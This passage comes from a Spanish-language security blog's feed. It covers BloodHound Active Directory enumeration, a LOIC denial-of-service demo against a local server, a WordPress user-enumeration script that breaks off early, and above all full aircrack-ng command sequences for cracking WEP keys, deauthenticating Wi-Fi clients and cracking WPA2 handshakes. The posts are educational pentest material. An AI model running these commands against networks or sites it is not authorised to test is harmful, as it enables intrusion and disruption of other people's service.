&lt;p&gt;Hecho esto, se nos abrirá un gráfico y nos indicará como explotar cada grupo para ir elevando privilegios.&lt;/p&gt;

&lt;p&gt;Lo que comentaba en el paso anterior, BloodHound tiene un panel el cual incorpora como abusar de ese privilegio para ganar acceso como Administrador.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;760&quot; height=&quot;500&quot; src=&quot;/assets/images/bloodhound/generic_all.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Salen también las referiencias para explotar esa vulnerabilidad por si se necesita mas información sobre dicha vulnerabilidad.&lt;/p&gt;

&lt;h2&gt;Python3 Bloodhound&lt;/h2&gt;

&lt;p&gt;En caso de tener credenciales válidas a nivel de sistema pero no tener acceso directo (por ejemplo con winrm), podremos utilizar la utilidad escrita en python3 de bloodhound. Con esta utilidad, no hace falta tener acceso al sistema, simplemente, con tener credenciales válidas, se podrá realizar la enumeración.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 bloodhound.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; e1abrador.local &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este caso, se generarán los archivos sin estar comprimidos. Los archivos generados deberían llamarse:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;123456_domains.json&lt;/li&gt;
  &lt;li&gt;123456_computers.json&lt;/li&gt;
  &lt;li&gt;123456_users.json&lt;/li&gt;
  &lt;li&gt;123456_groups.json&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En este punto el proceso es igual que con el archivo .zip comentado anteriormente, la idea sería arrastrar los archivos a bloodhound y funcionaría de la misma manera.&lt;/p&gt;

&lt;h2&gt;Como limpiar la base de datos&lt;/h2&gt;

&lt;p&gt;Esta pregunta la he visto mucho por las comunidades y los posts online, es bastante sencillo, si vamos a realizar una nueva enumeración, 
para dejar todo limpio de datos, lo podemos hacer de la siguiente manera:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;660&quot; height=&quot;500&quot; src=&quot;/assets/images/bloodhound/db.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="Windows" /><category term="BloodHound" /><category term="Domain Controller" /><category term="Active Directory" /><summary type="html">En este artículo, explico que es BloodHound y como utilizarlo en entornos de Active Directory.</summary></entry><entry><title type="html">Denial Of Service</title><link href="http://localhost:4000/ddos/" rel="alternate" type="text/html" title="Denial Of Service" /><published>2021-09-03T00:00:00+02:00</published><updated>2021-09-03T00:00:00+02:00</updated><id>http://localhost:4000/ddos</id><content type="html" xml:base="http://localhost:4000/ddos/">&lt;h2 id=&quot;qué-es-un-ataque-de-denegación-de-servicio&quot;&gt;¿Qué es un ataque de Denegación de servicio?&lt;/h2&gt;

&lt;p&gt;El ataque de &lt;strong&gt;Denegación de Servicio&lt;/strong&gt; consiste en inundar de solicitudes un servicio o red para dejarlo inhabilitado contra los usuarios legítimos.&lt;/p&gt;

&lt;p&gt;En este artículo hablaremos de 2 tipos de ataques: &lt;strong&gt;DoS&lt;/strong&gt; y &lt;strong&gt;DDoS&lt;/strong&gt;.&lt;/p&gt;

&lt;h2&gt;&lt;b&gt;DoS&lt;/b&gt;&lt;/h2&gt;

&lt;p&gt;El ataque DoS és un tipo de ataque (de los muchos que hay) de Denegación de Servicio, en este ataque las peticiones al servidor se ejecutan desde un único ordenador. En caso que el servidor objetivo cuente con algún firewall medianamente bien configurado, en el instante que se envíen X número de peticiones, la IP se bloqueará. Además, para que salga bien, el ordenador atacante tiene que contar con buenos componentes para poder añadir mas “threads” al programa y que se envíen mas peticiones por segundo al servidor.&lt;/p&gt;

&lt;h2&gt;&lt;b&gt;DDoS&lt;/b&gt;&lt;/h2&gt;

&lt;p&gt;El ataque de DDoS és también un ataque de denegación de servicio, en este caso, las peticiones se envían desde diferentes ordenadores a lo largo de la ciudad/país/continente/mundo, para hacer esto, el atacante hace uso de una BotNet.&lt;/p&gt;

&lt;h3&gt;&lt;b&gt;BotNet&lt;/b&gt;&lt;/h3&gt;

&lt;p&gt;Una &lt;strong&gt;BotNet&lt;/strong&gt; es un conjunto de ordenadores que han sido infectados por un malware y son controlados de forma remota por un atacante, estos ordenadores se conocen también como “Ordenadores Zombies”.
Cuando el atacante crea conveniente, utiliza todos los ordenadores infectados y lanza peticiones a un servidor. De esta forma, dado que las peticiones suelen venir de diferentes IP’s, al servidor se le hace imposible gestionar tantas requests, ya que por mas que se bloquee una IP, seguirán habiendo muchas peticiones por leer por parte del los bots. Cuantos mas ordenadores tenga controlado el atacante, serán mas altas las probabilidades de tumbar el servidor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; En este artículo no explicaré como hacer una BotNet, ya que no dispongo de tales ordenadores como para hacerlo, y evidentemente, no lo haré de forma ilegal.&lt;/p&gt;

&lt;h2&gt;Como se hace este ataque?&lt;/h2&gt;

&lt;p&gt;Hay muchos programas para utilizar, yo para este ejemplo, utilizaré LOIC (Low Orbit Ion Cannon), es un programa que se utiliza por los Administradores de Sistema para “estresar” un servidor web enviando un gran número de peticiones, de esta forma, el Administrador se puede hacer una idea de cuantos clientes pueden visitar una web sin que esta se colapse, este progrma se puede utilizar de forma “lícita” o de forma ilegal, yo, para evitar problemas legales, el “Proof of Concept” lo haré con un servidor web local.&lt;/p&gt;

&lt;p&gt;LOIC lo utilizaré en una máquina virtual windows (windows 10), dejo el enlace de descarga:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/projects/loic/&quot;&gt;https://sourceforge.net/projects/loic/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Especificaciones de la máquina virtual Windows 10&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;RAM -&amp;gt; &lt;strong&gt;6000 MB&lt;/strong&gt; (6GB)&lt;/li&gt;
  &lt;li&gt;Procesadores -&amp;gt; &lt;strong&gt;8&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Espacio en Disco Duro -&amp;gt; &lt;strong&gt;100 GB&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como servidor web, utilizaré un servidor apache normal, el host será una máquina kali.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Especificaciones de la máquina virtual Kali Linux&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;RAM -&amp;gt; &lt;strong&gt;5000 MB&lt;/strong&gt; (5GB)&lt;/li&gt;
  &lt;li&gt;Procesadores -&amp;gt; &lt;strong&gt;4&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Espacio en Disco Duro -&amp;gt; &lt;strong&gt;80 GB&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vamos a empezar con el “Overview” en la máquina Windows. Vemos que los paquetes ICMP no tardan mas de 1ms, esto es normal dado que estamos en una red local:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dos/icmp_requests.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora, vamos a ver que tal se comporta el servidor cuando inciamos el LOIC.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dos/LOIC_started.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hay que tener en cuenta que la configuración de componentes de las 2 máquinas es desigual, ya que la máquina Windows cuenta con 8 procesadores y 6 GB de RAM y la máquina Kali cuenta con 5 GB y 4 procesadores. Igualmente, en la imagen, se puede comprobar que ha habido momentos en los que el servidor no respondía, en este caso, como es una máquina virtual, no le he podido poner mas “threads” (cuantos mas se pongan, mas alta será la posibilidad de tumbar la web). Si le poneis mejores especificaciones a la MV podréis probarlo mas “a lo grande”.&lt;/p&gt;

&lt;p&gt;Ahora, vamos a ver que ha pasado por detrás en los logs del apache. La ruta en Linux es “/var/log/apache2/access.log”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dos/connections_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dos/a_cat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que hay momentos en los que el servidor no ha podido capturar todas las requests, estos mensajes de “A cat is fine too” han salido ya que es el mensaje que envía LOIC al servidor de forma continua. La parte que no cargaba la web eran momentos puntuales por lo que he comentado antes, no són máquinas con grandes especificaciones y para tumbar una web se necesitas mejores componentes en el PC.&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="dos" /><category term="Denial of Service" /><summary type="html">En este artículo, explico la diferencia entre un ataque Dos y DDoS y como ejecutar un ataque DoS con un ejemplo básico.</summary></entry><entry><title type="html">airAttack</title><link href="http://localhost:4000/airAttack/" rel="alternate" type="text/html" title="airAttack" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/airAttack</id><content type="html" xml:base="http://localhost:4000/airAttack/">&lt;p&gt;&lt;img src=&quot;/assets/images/airAttack/AIR-ATTACK-Header.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;airAttack&lt;/strong&gt; es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determinadas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).&lt;/p&gt;

&lt;p&gt;En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad y como ejecutarlo manualmente.&lt;/p&gt;

&lt;p&gt;La herramienta se puede descargar en:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/e1abrador/airAttack&quot;&gt;https://github.com/e1abrador/airAttack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt; Ataques WEP &lt;/h2&gt;

&lt;p&gt;Antes de empezar con los ataques WEP, es importante recalcar que todos estos ataques están enfocados obtener el máximo número de IVS para poder crackear la contraseña, a diferéncia de los ataques WPA2, cuya prioridad es obtener el hash de la red para poder posteriormente crackearlo.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IVS:&lt;/strong&gt; Los IVS, también conocidos como “Archivos de Vector de inicialización”, se clasifican como archivos de datos que contienen vectores de  inicialización que son necesarios para la generación de los datos cifrados en la red.&lt;/p&gt;

&lt;h3&gt;&lt;u&gt;Chop&lt;/u&gt; &lt;u&gt;Chop&lt;/u&gt; &lt;u&gt;Attack&lt;/u&gt;&lt;/h3&gt;
&lt;p&gt;El ataque de &lt;strong&gt;Chop Chop&lt;/strong&gt; consiste en coger un byte de datos de un paquete encriptado WEP, substituyendo los valores de los bytes del paquete y recalculando la suma de verificación del encriptado. Los paquetes ya modificados se envían al router, el router simplemente los descarta hasta que el atacante finalmente logra sustituir una suma de verificación válida.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; captura wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; 6000 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_tarjeta wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_tarjeta wlan0
packetforge-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_tarjeta &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 192.168.1.2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; 192.168.1.255 &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xor &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ataque_chopchop
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ataque_chopchop wlan0
aircrack-ng captura-01.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; Es importante dejar un pequeño espacio de tiempo entre comando y comando y esperar a que cada comando se inyecte correctamente en el router.&lt;/p&gt;

&lt;h3&gt;&lt;u&gt;SKA&lt;/u&gt;&lt;/h3&gt;
&lt;p&gt;El ataque &lt;strong&gt;SKA&lt;/strong&gt;, también conocido como “Broken Shared Key Authentication” consiste en copiar la dirección MAC de un cliente ya conectado a la red en nuestra própia tarjeta de red y generar un ataque de falsa autenticación con nuestra nueva MAC (MAC copiada del cliente previamente autenticado), el objetivo de autenticar nuestra MAC es generar paquetes ARP en la red.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap wlan0 -&amp;gt; Por ahora no es necesario empezar a capturar paquetes.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Cuando tenemos el punto de acceso localizado y la MAC localizada, dejaremos de ver el tráfico de la red con airodump y procederemos a cambiar la MAC de nuestra tarjeta de red, con el siguiente one-liner se puede cambiar.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig wlan0 down &amp;amp;&amp;gt; /dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; macchanger &lt;span class=&quot;nt&quot;&gt;--mac&lt;/span&gt; mac_de_cliente wlan0 &amp;amp;&amp;gt; /dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ifconfig wlan0 up &amp;amp;&amp;gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Nota&lt;/strong&gt;: Puede que sea necesario ejecutar por segunda vez el one-liner para que se cambie correctamente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; captura &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_tarjeta wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; essid_de_ap &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_de_ap wlan0
aircrack-ng captura-01.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3&gt;&lt;u&gt;ARP&lt;/u&gt; &lt;u&gt;Request&lt;/u&gt; &lt;u&gt;Replay&lt;/u&gt; &lt;u&gt;Attack&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;El ataque de &lt;strong&gt;ARP Request Replay Attack&lt;/strong&gt; consiste en inyectar nuestra MAC en el router víctima, posteriormente se genera un ataque de denegación de servicio sobre uno de los clientes conectados (si este ataque se lanza contra todos, se obtendrán mas IVS, haciendo que la probabilidad de crackear la clave será más alta) y, cuando dichos clientes se vuelvan a conectar a la red, se genererarán de forma automática paquetes ARP, lo que generará IVS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; captura &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_de_tarjeta wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_de_cliente_conectado wlan0
aircrack-ng captura-01.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3&gt;&lt;u&gt;Fragmentation&lt;/u&gt; &lt;u&gt;Attack&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;Este ataque necesita que 1 único paquete de datos sea capturado por airodump. Posteriormente, se genera un nuevo paquete modificado con la dirección MAC de nuestra tarjeta de red y se inyecta el paquete modificado por el atacante en el punto de acceso objetivo. De esta forma, se generarán paquetes ARP y, en consecuéncia, los IVS necesários para crackear la clave.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; captura &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; 6000 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 10 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_tarjeta wlan0 -&amp;gt; es muy recomendable dejar el cliente inyectado, ya que facilitará la obtención del paquete de datos.
packetforge-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_de_tarjeta &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 192.168.1.2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; 192.168.1.255 &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xor &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; fragmentation_attack
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; fragmentation_attack wlan0
aircrack-ng captura-01.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2&gt; Ataques WPA2 &lt;/h2&gt;

&lt;p&gt;El protocolo WPA2 hace años que empezó a monopolizarse en los routers instalados por las compañías telefónicas. Aun que si que es verdad que el protocolo WEP no se suele utilizar, aún hay routers que lo implementan, ya que hay dispositivos (si són de última generación suele no pasar) que únicamente aceptan el procolo WEP.&lt;/p&gt;

&lt;p&gt;El objetivo en estas redes es obtener un hash para poder crackearlo mediante el uso de un diccionario de contraseñas.&lt;/p&gt;

&lt;h3&gt;&lt;u&gt;Ataque&lt;/u&gt; &lt;u&gt;de&lt;/u&gt; &lt;u&gt;deautenticación&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;El &lt;strong&gt;ataque de deautenticación&lt;/strong&gt; ataque es un ataque de denegación de servicio, el objetivo es provocar que la víctima se reconecte al punto de acceso, en el momento que un dispositivo se conecta al router, se genera un packete handshake, el cual contiene la contraseña hasheada de la red inalámbrica.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; canal_de_ap &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; captura wlan0
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 15 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; mac_de_cliente wlan0 -&amp;gt; se utiliza para deautenticar a un solo cliente de la red
aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 15 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; mac_de_ap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; FF:FF:FF:FF:FF:FF  wlan0 -&amp;gt; se utiliza para deautenticar a todos los clientes de la red
aircrack-ng &lt;span class=&quot;nt&quot;&gt;-J&lt;/span&gt; miCaptura captura.cap
hccap2john miCaptura.hccap &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash
&lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="shell" /><category term="wireless" /><category term="aircrack-ng" /><category term="wireless_pentesting" /><summary type="html">En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWP como primera release.</summary></entry><entry><title type="html">wp_userScan</title><link href="http://localhost:4000/wp_userScan/" rel="alternate" type="text/html" title="wp_userScan" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/wp_userScan</id><content type="html" xml:base="http://localhost:4000/wp_userScan/">&lt;h2 id=&quot;qué-es-wps_usersscan&quot;&gt;¿Qué es wps_usersScan?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;wps_usersScan&lt;/strong&gt; es un pequeño script en bash ideal para realizar la enumeración de usuarios en cualquier web que utilice Wordpress como CMS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wpsUsersScan/wpsusers.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para utilizar la herramienta, es tan fácil como ejecutarla:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./wps_usersScan.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Seguidamente, saldrá un pequeño input en el cual se tiene que introducir una dirección URL. El programa concaternará de forma automática la dirección proporcionada por el usuario con el lugar donde se almacenan los usuarios de forma pública. Hay un bucle para que se ejecute del 1 a 1000, en caso que se quiera seguir enumerando, se puede alterar la cifra.&lt;/p&gt;

&lt;h3&gt;Código de la herramienta&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;greenColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;32m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;redColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;31m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;34m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;yellowColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;33m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;purpleColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;35m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;turquoiseColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;36m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;grayColour&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0;37m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt;

